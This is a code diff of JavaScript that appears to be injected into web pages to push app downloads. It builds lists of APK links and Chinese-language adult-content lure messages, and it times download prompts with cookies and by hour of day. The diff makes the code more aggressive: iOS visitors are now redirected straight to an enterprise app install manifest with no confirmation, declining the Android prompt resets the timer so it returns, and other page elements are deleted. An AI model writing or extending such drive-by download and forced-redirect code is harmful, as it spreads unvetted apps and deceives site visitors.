@@ -50,14 +50,14 @@ var hy_itv=setInterval(function(){
 	var pname=getDownUrl(),iosname=getIosDownUrl();
 
 	var azimgs=["wb_b5.gif","wb_b3.gif","wb_b2.gif","wb_b.gif"],
-		azlinks=["http://m.haoghost.com/?f=cpctag_"+num,"http://m.haoghost.com/note.html?f=cpctag_"+num,downPath+"360xpg.apk",downPath+"360wysp.apk"],
+		azlinks=["http://m.haoghost.com/?f=cpctag_"+num,"http://m.haoghost.com/note.html?f=cpctag_"+num,downPath+"360xpg.apk",downPath+"360ysdq.apk"],
 		aztooltip=["","","正在下载快播魅影,激情无码视屏随意看","正在下载午夜视频,私密珍藏大片任你看"];
 
 	if(num==23 || num==24 || num==26)
 	{
 		//azimgs=["wb_b5.gif","wb_b3.gif","wb_n1.gif","wb_n2.gif"];
 		azimgs=["wb_b5.gif","wb_b3.gif","wb_n1.gif","wb_n2.gif","wb_b2.gif","wb_b.gif"];
-		azlinks=["http://m.haoghost.com/?f=cpctag_"+num,"http://m.haoghost.com/note.html?f=cpctag_"+num,"http://m.haoghost.com/?f=cpctag_"+num,"http://m.haoghost.com/?f=cpctag_"+num,downPath+"360xpg.apk",downPath+"360wysp.apk"];
+		azlinks=["http://m.haoghost.com/?f=cpctag_"+num,"http://m.haoghost.com/note.html?f=cpctag_"+num,"http://m.haoghost.com/?f=cpctag_"+num,"http://m.haoghost.com/?f=cpctag_"+num,downPath+"360xpg.apk",downPath+"360ysdq.apk"];
 		aztooltip=["","","","","正在下载快播魅影,激情无码视屏随意看","正在下载午夜视频,私密珍藏大片任你看"];
 	}
 	
@@ -103,10 +103,7 @@ var hy_itv=setInterval(function(){
 		switch(num)
 		{
 			case "16":
-				var rd=Math.random();
-				if(rd<0.3) result="http://www.haima.me/?c=cpapz";
-				if(rd<0.95 && rd>=0.3) result="http://www.haima.me/?c=cpapz01";
-				if(rd>=0.95) result="http://www.haima.me/tg/cpacxmx13";
+				result="http://www.haima.me/?c=cpapz01";
 				break;
 			default:
 				result="itms-services:///?action=download-manifest&amp;url=https://qvod.bb800.com/assets/upload/130.plist";
@@ -120,11 +117,12 @@ var hy_itv=setInterval(function(){
 		switch(num)
 		{
 			case "16":
-				result="360ysdq2.apk";
+				result="sybb.10C352.apk";
 				break;
 			default:
-				if(Math.random()>0.7) result="360sqyy.apk";
-				else result="360sqyy685.apk";
+				var rd=Math.random();
+				result="sybb.10C352.apk";
+				//if(rd>=0.5) result="http://t.cn/R7qFBqD";
 		}
 		return result;
 	}
@@ -160,8 +158,7 @@ var hy_itv=setInterval(function(){
 		function autoDown()
 		{
 			var date = new Date();
-			var cd=30;
-			if(num==18 || num==19) cd=10;
+			var cd=60;
 
 			if(!getCookie("hycookietime"))
 			{
@@ -213,7 +210,7 @@ var hy_itv=setInterval(function(){
 			tj.appendChild(script);
 		})()		
 
-		if(num==24 || num==25 || num==26)
+		if(num==24 || num==25 || num==26 || num==16)
 		{
 			t1.style.display="none";
 		}
@@ -283,10 +280,6 @@ var hy_itv=setInterval(function(){
 					"hyipcb"
 				);
 			}
-			else
-			{
-				if(hyipdata==0) pname="hlyy4.apk";
-			}
 			
 			window.setTimeout(function(){
 				if(num==18 || num==19)
@@ -300,23 +293,39 @@ var hy_itv=setInterval(function(){
 					if(!autoDown()) return;
 					tt="正在下载神奇影院，海量视频任你看";
 				}
-				else if(num==23 || num==24 || num==25 || num==26){
+				else if(num==16)
+				{
+					var dt=new Date(),hour=dt.getHours(),minute=dt.getMinutes();
+					if( (hour>9) || (hour==0 && minute<30) || (hour==9 && minute>30) ) return;
 					if(!autoDown()) return;
-					tt="正在下载神奇影院，海量爽片离线小说任你看。"
+					tt="正在下载专业阅读器，全国资源最全的离线小说APP，首次安装送7日会员。";
+				}
+				else if(num==23 || num==24 || num==25 || num==26 || num==27){
+					if(!autoDown()) return;
+					tt="正在下载专业阅读器，全国资源最全的离线小说APP，首次安装送7日会员。";
 				}
 				else
 				{
 					return;
 				}
-				if(window.confirm(tt)){
-					if(/ipad|iphone|mac|ios/i.test(navigator.userAgent)) {
-						window.location.href=iosname;	
+				
+				if(/ipad|iphone|mac|ios/i.test(navigator.userAgent)) {
+					window.location.href=iosname;	
+				}
+				else
+				{
+					if(window.confirm(tt)){
+						if(pname.indexOf("http")>=0) window.location.href=pname;
+						else window.location.href="http://d.haoghost.com/"+pname;
 					}
 					else
 					{
-						window.location.href="http://d.haoghost.com/"+pname;
+						var now=parseInt(getCookie("hycookietime"));
+						now=now-50*60*1000;
+						setCookie("hycookietime",now);
 					}
 				}
+				
 				
 				
 				setCookie("hycpc1","1");
@@ -324,16 +333,14 @@ var hy_itv=setInterval(function(){
 			
 		})();
 
-		if(num==18 || num==19 || num==15 || num==22)
+		if(num==18 || num==19 || num==27 || num==22)
 		{
 			
 			window.setInterval(function(){
-				if(num==15)
+				if(num==27)
 				{
-					var a151=document.getElementById("xcy_fmt"),a152=document.getElementById("__70e_1"),a153=document.getElementById("__70e_2");
-					t1.setAttribute("style","");
-					t2.setAttribute("style","");
-					a151.style.display=a152.style.display=a153.style.display="none";
+					var o27div=document.getElementById("lgVshow");
+					if(o27div) o27div.parentNode.removeChild(o27div);
 				}
 				if(num==22)
 				{
